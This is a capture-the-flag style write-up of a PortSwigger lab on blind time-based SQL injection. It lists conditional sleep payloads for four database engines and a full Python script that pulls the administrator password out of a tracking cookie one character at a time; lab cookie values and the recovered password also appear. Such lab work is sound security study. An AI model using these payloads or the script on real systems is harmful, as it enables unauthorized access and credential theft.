+++
title = "SQLi Vulnerabilities: Lab 12: Blind SQL injection with time delays and information retrieval"
date = 2025-12-05
lastmod = 2025-12-05
draft = false
author = "bloodstiller"
description = "PortSwigger sqli lab write-up using time based delay SQL Injection to enumerate & extract data from SQL databases using python and burpsuite" 
tags = [
  "WebSecurity",
  "PortSwigger",
  "web-exploitation",
  "security-research",
  "portswigger-labs",
  "ctf-writeup",
  "injection",
  "sql",
  "sqli",
  "python",
  "time-delay"
]
keywords = [
  "authentication vulnerabilities",
  "SQL",
  "SQLi",
  "PortSwigger authentication lab",
  "web security"
]
toc = true
bold = true
next = true
+++

## Lab 12: Blind SQL injection with time delays and information retrieval: {#lab-12-blind-sql-injection-with-time-delays-and-information-retrieval}

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
>
> The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
>
> To solve the lab, log in as the `administrator` user.


### Initial Reconnaissance/Discovery: {#initial-reconnaissance-discovery}

We are given access to a standard shop front. 


### Establishing SQLi With Time Delays: {#establishing-sqli-with-time-delays}

Usually we could just add a single quotation mark and observe the response however that will not work in this case as the application responds exactly the same regardless of if there is an error or not. However if we read the portswigger section we can see below quote.

> As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. **This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response**.

+Note+: bolding by me.

If we take a look at the [SQL Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) on portswigger labs we can see the below syntax is used for triggering time delays.

```sql
Oracle 	dbms_pipe.receive_message(('a'),10)
Microsoft 	WAITFOR DELAY '0:0:10'
PostgreSQL 	SELECT pg_sleep(10)
MySQL 	SELECT SLEEP(10)
```

Just underneath that we can see the below conditional time delays.

```sql
--Oracle
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
--Microsoft
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
--PostgreSQL
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
--MySQL
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

If we modify them to actually be useful, e.g. allow us to drop them straight into intruder as valid payloads they look like below.

```sql
--Oracle
'||(SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual)||'--

--Microsoft
'+SELECT CASE WHEN 1=1 THEN WAITFOR DELAY '0:0:10' ELSE 0 END+'--

--PostgreSQL
'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)||'--

--MySQL
' (SELECT IF(1=1,SLEEP(10),'a'))#
```

{{< figure src="/ox-hugo/2025-12-05_14-57.png" >}}

Looking at the response received we can see that this is a PostgreSQL database.
![](/ox-hugo/2025-12-05_14-57_1.png)

Now that we know this, we can as True or False (boolean) based questions to trigger a response. If the condition is `True` we trigger a time delay and if the condition is `False` we trigger no time delay.


### Extracting The Administrators Password: {#extracting-the-administrators-password}

Using the previous query above as the basis for our payload we can do something similar to previous labs. Using the `SUBSTRING/SUBSTR` method we can check if the value of the that character is equal to a payload we provide. By doing this we can iterate through alphanumerical characters and extract data from the database.

As we know there is a Users table with the columns `users` &amp; `passwords` we can jump directly to extracting the administrators password.

For this we will use the below payload.

```sql
'|| (SELECT CASE WHEN (SUBSTR(password,[substringPosition],1) = '[Payload]') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'--
```


#### Using Burp: {#using-burp}

We send the request to Intruder &amp; set the attack type to "Clusterbomb".

For our first position (substring) we can supply a numerical list of `1-20`
![](/ox-hugo/2025-12-02_15-23.png)

For our second position we supply a list of alphanumerical characters A-Z lower+uppercase as well as numbers.

Now we start the attack.

If we filter by "Response Received" we can see all of our payloads which took 2+ seconds, signifying a `True` signal.
![](/ox-hugo/2025-12-05_16-03.png)

Putting them in order gives me the password: `tkm35cbgm31n51irshn6` which I can then use to login &amp; solve the lab.

{{< figure src="/ox-hugo/2025-12-05_15-40.png" >}}


#### Using Python: {#using-python}

As usual I am going to show how this can also be solved using Python.


##### Prep The Certificate: {#prep-the-certificate}

If you want to proxy traffic through burp this is mandatory.

Open burp's in built web browser and go to <http://burpsuite> &amp; download the certificate by clicking on “CA Certificate” button on the top right corner.
![](/ox-hugo/2025-11-06_05-56.png)

Convert the certificate to the `.pem` format so the python requests module can use it.

```shell
openssl x509 -inform der -in certificate.cer -out certificate.pem
```


##### payload.txt creation: {#payload-dot-txt-creation}

As we need to iterate through all alphanumerical characters it is better to have a `payload.txt` file that contains all the characters as it's far cleaner than having thes values hard coded. Below is a snippet of what this looks like.

```txt
v
w
x
y
z
A
B
C
```


##### Imports: {#imports}

First we import the modules we will need, `requests`, `os` &amp; `datetime`. We also suppress the `requests` warning that will show.

```python
import requests
import os
import datetime
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
```

If we didn't suppress the warnings the output would look like this.
![](/ox-hugo/2025-11-06_06-02.png)


##### Proxy Setup: {#proxy-setup}

Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.

```python
proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"
```


##### Variable Declaration: {#variable-declaration}

<!--list-separator-->

-  Proxies &amp; URL:

    We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.

    ```python
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
    url="https://0a7300f5039f81a482889c5a007800d0.web-security-academy.net/"
    ```

<!--list-separator-->

-  Empty String:

    We just need a single empty string to store the revealed password as we uncover each value.

    ```python
    revealedPass=""
    ```


##### Main Logic: {#main-logic}

We declare a loop that will run from position 1 to position 21.

```python
for substringPosition in range(1, 21):
```

Then we have a `try` block which will be used to contain the rest of our logic.

We open our `payloads.txt` file and read mode.

```python
with open("payload.txt", 'r') as payloads:
```

We then iterate through this file, line by line.

```python
for x in payloads:
```

We create a variable called `passwordChar` which is used to store the current value from our `payload.txt` file minus the new character symbol at the end of each line.

```python
passwordChar=(x.rstrip('\n'))
```

We create a payload string where we pass in the payload previous used + our `substringPosition` (where we are in the iterations from 1-21) as well as the `passwordChar` from our `payload.txt` file.

```python

payload=f"'|| (SELECT CASE WHEN (SUBSTR(password,{substringPosition},1) = '{passwordChar}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'--"
```

We then send our request which contains the cookies `TrackingId` + our payload &amp; the `Session` cookie.

```python
request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={
    'TrackingId' : 'GKkVLtBVPDgnQj2W'+payload,
    'session' : 'GgXHDXmJltEuxP7YgEb5dws0SojkNZBB'
})
```

+Note+: You actually don't need to supply valid `TrackingId` or `session` cookie. These are values from a previous lab and it still worked.

**Response Monitoring**: We then monitor the responses and filter for response times that take over 2 seconds as these are our `True` responses.

-   Add the `passwordChar` value to our empty list `revealedPass`
-   We will print the string `"Password char position {substringPosition} == {passwordChar}."`
-   We will then print the current contents of the `revealedPass` string.

<!--listend-->

```python
if request.elapsed > datetime.timedelta(seconds=2):
    revealedPass+=passwordChar
    print("-"*10)
    print(f"Password char position {substringPosition} == {passwordChar}.")
    print(revealedPass)
```

Full chunk:

```python
for substringPosition in range(1, 21):
    try:
       with open("payload.txt", 'r') as payloads:
           for x in payloads:
               passwordChar=(x.rstrip('\n'))
               payload=f"'|| (SELECT CASE WHEN (SUBSTR(password,{substringPosition},1) = '{passwordChar}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'--"

               request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={
                   'TrackingId' : 'GKkVLtBVPDgnQj2W'+payload,
                   'session' : 'GgXHDXmJltEuxP7YgEb5dws0SojkNZBB'
               })
               if request.elapsed > datetime.timedelta(seconds=2):
                   revealedPass+=passwordChar
                   print("-"*10)
                   print(f"Password char position {substringPosition} == {passwordChar}.")
                   print(revealedPass)
```


##### Error Handling: {#error-handling}

These `except` clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.

```python
    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Full Script: {#full-script}

```python
#!/usr/bin/env python3
#!/usr/bin/env python3
import requests
import os
import datetime
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

proxy = 'http://127.0.0.1:8080'
os.environ['HTTP_PROXY'] = proxy
os.environ['HTTPS_PROXY'] = proxy
os.environ['REQUESTS_CA_BUNDLE'] = "certificate.pem"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
url="https://0a7300f5039f81a482889c5a007800d0.web-security-academy.net/"

revealedPass=""

for substringPosition in range(1, 21):
    try:
       with open("payload.txt", 'r') as payloads:
           for x in payloads:
               passwordChar=(x.rstrip('\n'))
               payload=f"'|| (SELECT CASE WHEN (SUBSTR(password,{substringPosition},1) = '{passwordChar}') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'--"

               request=requests.get(url, proxies=proxies, verify=False, timeout=3, cookies={
                   'TrackingId' : 'GKkVLtBVPDgnQj2W'+payload,
                   'session' : 'GgXHDXmJltEuxP7YgEb5dws0SojkNZBB'
               })
               if request.elapsed > datetime.timedelta(seconds=2):
                   revealedPass+=passwordChar
                   print("-"*10)
                   print(f"Password char position {substringPosition} == {passwordChar}.")
                   print(revealedPass)


    except requests.exceptions.HTTPError as errh:
        print ("Http Error:",errh)
    except requests.exceptions.ConnectionError as errc:
        print ("Error Connecting:",errc)
    except requests.exceptions.Timeout as errt:
        print ("Timeout Error:",errt)
    except requests.exceptions.RequestException as err:
        print ("OOps: Something Else",err)
```


##### Solving The Lab: {#solving-the-lab}

If we run the script we can see it prints the password out character by character.
![](/ox-hugo/2025-12-05_15-59.png)

And we can ensure this is correct by logging in and solving the lab.
![](/ox-hugo/2025-12-05_15-58.png)
